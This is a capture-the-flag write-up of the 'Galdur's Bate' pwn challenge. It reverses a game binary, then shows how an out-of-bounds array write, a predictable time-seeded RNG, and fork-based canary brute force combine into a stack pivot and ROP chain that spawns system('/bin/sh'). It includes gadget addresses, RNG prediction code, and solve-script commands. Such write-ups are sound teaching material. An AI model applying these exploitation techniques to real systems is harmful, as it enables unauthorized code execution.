---
title: "Galdur's Bate — CSCPT Quals 2026 Pwn"
date: '2026-06-20'
draft: false
authors: ['ang3lo']
tags: ['pwn', 'stack', 'ROP']
summary: 'Out-of-bounds write via party member array overflow leads to stack pivot and ROP chain execution. Predictable srand(time(0)) riddle bypass. Fork-based server requires canary brute-force.'
canonical: ''
---

# Galdur's Bate

**Category**: Pwn — **Points**: 500

> The city of Galdurs Bate is in grave danger! But is your party strong enough to save it?
>
> `nc 178.105.86.125 26102`

**Files**: `galdurs_bate` (x86_64 ELF, dynamically linked), `libc.so.6` (glibc 2.39)

---

## Table of Contents

1. [Reversing](#reversing)
2. [Vulnerabilities](#vulnerabilities)
3. [Exploit](#exploit)
4. [Solve Script](#solve-script)

---

## Reversing

The binary is a text-based dungeon crawler with a D&D theme. The decompiled pseudocode (via Binary Ninja / Ghidra) reveals the key structures and flow.

### Character Struct (32 bytes)

```c
struct Character {
    char   name[8];      // +0x00
    int64_t strength;    // +0x08
    int64_t dexterity;   // +0x10
    int64_t charisma;    // +0x18
};
```

### Key Functions

**`createCharacter(dest, name, str, dex, cha)` at `0x4012ed`**

```c
if (str)   strncpy(name, str, 8);          // name[0x00] = str
else       read(0, name, 8);               // name[0x00] = user input

if (dex)   *(uint64_t*)(name + 8) = dex;   // name[0x08] = dex
else       scanf("%ld", &name[8]);          // name[0x08] = user input

if (cha)   *(uint64_t*)(name + 0x10) = cha; // name[0x10] = cha
else       scanf("%ld", &name[0x10]);        // name[0x10] = user input

// 6th arg via r9 (caller-controlled or garbage)
if (r9)    *(uint64_t*)(name + 0x18) = r9;
else       scanf("%ld", &name[0x18]);        // name[0x18] = user input
```

**`main()` at `0x401a62`**

Key stack layout (verified via dynamic analysis):

```
rbp_main - 0x70:  partyMembers[0]   (32 bytes)
rbp_main - 0x50:  partyMembers[1]   (32 bytes)
rbp_main - 0x30:  partyMembers[2]   (32 bytes)
rbp_main - 0x10:  <gap>
rbp_main - 0x08:  canary
rbp_main + 0x00:  saved RBP
rbp_main + 0x08:  return address
```

Main flow:
1. `srand(time(0))` — seed the RNG
2. `createCharacter` for the player (all 4 values from user input)
3. `read(0, &player_description, 0xc8)` — read 200 bytes into global buffer at `0x405540`
4. `createCharacter` for 3 preset party members (Dale, Farlach, Bae'zel)
5. Game loop: navigate rooms (encounter / dialogue / quit)

**`handleDialogue()` at `0x401859`** — Room 3, the riddle room.

On first visit, the player must guess the output of `rand()`. On success:

```c
numPartyMembers = 4;  // was 3, now 4
createCharacter(&local, &partyMembers[3], "Menthara", 0, 0);
```

Since `dex=0` and `cha=0`, Menthara's strength and dexterity are read from `scanf("%ld")` — **user-controlled**.

---

## Vulnerabilities

### 1. Out-of-Bounds Write (Critical)

`partyMembers` is declared with size 3 (indices 0-2) in `main`. Adding Menthara at `partyMembers[3]` writes beyond the array into `main`'s saved frame:

| Menthara field | Offset from array | Stack address      | Original content  |
|---------------|-------------------|--------------------|--------------------|
| `name`        | `+0x00`           | `rbp-0x10`        | gap/unused         |
| `strength`    | `+0x08`           | **`rbp-0x08`**    | **canary**         |
| `dexterity`   | `+0x10`           | **`rbp+0x00`**    | **saved RBP**      |
| `charisma`    | `+0x18`           | **`rbp+0x08`**    | **return address** |

Menthara's name ("Menthara") is written to `rbp-0x10` (harmless). But the attacker controls the subsequent three `scanf("%ld")` calls, giving arbitrary 8-byte write primitives to:

- **canary** — must be preserved (or known) for the stack check to pass
- **saved RBP** — stack pivot target
- **return address** — control flow hijack

### 2. Predictable RNG (Riddle Bypass)

The riddle compares the player's guess against `rand()`, seeded with `srand(time(0))`. The server timestamp can be estimated within a ±3-second window. Using the provided `libc.so.6` (glibc 2.39), we compute `rand()` for each candidate seed at connection time.

### 3. Fork-Based Server (Canary Static)

The server forks for each connection. The canary (from `AT_RANDOM` in the parent's auxv) remains constant across all connections to the same server process. This enables:
- **Byte-by-byte brute force**: try a canary value, quit to trigger `__stack_chk_fail` or not, and brute-force each byte.

---

## Exploit

### Strategy

Two-stage attack:
1. **Stage 1**: Leak libc base via `puts(puts@GOT)`, then return to `main` for a second pass.
2. **Stage 2**: Call `system("/bin/sh")` or perform ORW (`open`/`read`/`puts`) to read `flag.txt`.

### Stack Pivot

The pivot uses a double `leave; ret` sequence:

```
[main's epilogue @ 0x40221e]
    leave                 → mov rsp, rbp_main; pop rbp
                           → rbp = [rbp_main] = player_desc (0x405540)
    ret                   → rip = [rbp_main+8] = leave_ret (0x40221e)

[leave_ret gadget @ 0x40221e again]
    leave                 → mov rsp, player_desc; pop rbp
                           → rbp = [player_desc] = dummy (0)
    ret                   → rip = [player_desc+8] = start of ROP chain
```

The `player_description` buffer layout:

```
+0x00:  p64(0)          # dummy RBP for leave's pop
+0x08:  ROP_CHAIN       # gadgets and arguments
```

### ROP Gadgets

Found in the function epilogue at `sub_0x404120` (0x4012b6):

| Gadget | Address   | Bytes |
|--------|-----------|-------|
| `pop rdi; ret`      | `0x4012BE` | `5f c3` |
| `pop rdx; ret`      | `0x4012C0` | `5a c3` |
| `xchg rsi, rdi; ret`| `0x4012C2` | `87 f7 c3` |
| `pop rbp; ret`      | `0x4012C7` | `5d c3` |
| `ret` (align)       | `0x40101A` | `c3` |
| `leave; ret`        | `0x4012EB` | `c9 c3` |

### Stage 1: Libc Leak

```
pop rdi; ret
puts@GOT                  → puts(puts@GOT) leaks libc address
puts@PLT
main_addr                 → return to main for stage 2
```

### Stage 2: Shell

```
ret                       # stack alignment (movaps requirement)
pop rdi; ret
"/bin/sh"                 → system("/bin/sh")
system
```

### Canary Brute Force (Fork-Based)

Since `scanf("%ld", &name[8])` overwrites `rbp-0x08` (the canary), we must send the correct value to pass the stack check on `main` return. The server forks, so the canary is invariant. Brute force one byte at a time:

1. For byte position `i` (0-6, LSB is fixed 0x00):
2. Guess byte value `b`, construct partial canary
3. Send exploit; if connection stays alive → correct byte
4. If `*** stack smashing detected ***` → wrong byte, try next

### RNG Prediction

```python
def predicted_rands(window):
    clibc = CDLL("libc.so.6")
    now = int(time.time())
    for offset in [-3, -2, -1, 0, 1, 2, 3]:
        seed = now + offset
        clibc.srand(seed)
        yield seed, clibc.rand()
```

---

## Solve Script

Two versions are provided:

### `solve.py` — Full Two-Stage (with libc leak)

Uses the provided `ld-2.39.so` / `libc.so.6` for accurate RNG prediction. Runs on the patched binary (`galdurs_bate_patched`). Requires `rand_test` helper compiled for the challenge libc.

**Usage**: Set up the environment with the provided libc, then run:

```bash
python3 solve.py
```

### `new_solve.py` — Single-Stage (known libc base)

Takes `--canary` and `--libc-base` as arguments. Supports `--shell` (interactive), `--cmd` (one-shot command), or default ORW flag read.

```bash
# ORW flag read (default)
python3 new_solve.py --canary 0x... --libc-base 0x... HOST PORT

# Interactive shell
python3 new_solve.py --shell --canary 0x... --libc-base 0x... HOST PORT

# One-shot command
python3 new_solve.py --cmd "cat flag.txt" --canary 0x... --libc-base 0x... HOST PORT

# Local debugging
python3 new_solve.py --local
```

### Key Exploit Functions

**`build_description(rop_chain)`** — Embeds the ROP chain at offset +8 of `player_description`, leaving a dummy RBP at offset 0 for the stack pivot.

**`add_menthara(r, canary, saved_rbp, return_addr)`** — Triggers after solving the riddle. Sends:
- `s64(canary)` → overwrites `rbp-0x08` — preserves canary
- `PLAYER_DESCRIPTION` → overwrites `rbp+0x00` — stack pivot target
- `LEAVE_RET` → overwrites `rbp+0x08` — first return to `leave;ret` gadget

**`build_rop(libc_base, libc_elf, ...)`** — Constructs either a `system("/bin/sh")` or ORW (`open` → `read` → `puts`) chain at known offsets within `player_description`.

### Steps Executed

1. **Connect** and capture `int(time.time())` for RNG prediction
2. **Create player**: send ROP payload in the 200-byte description
3. **Navigate**: Room 0 → forward (1) → Room 1 → right (4) → Room 3 (dialogue)
4. **Guess riddle**: try seeds in time window until `Menthara's strength` prompt appears
5. **Send controlled stats**: canary, pivot address, `leave;ret` gadget
6. **Quit (option 5)**: triggers `main`'s epilogue → canary check → stack pivot → ROP
7. **(Stage 1)** `puts` leaks libc, `main` restarts the game
8. **(Stage 2)** Repeat with new ROP: `system("/bin/sh")`
9. **Win**: shell obtained, `flag.txt` read

### Flag

`CSCPT{...}` — obtained via shell on the remote server.
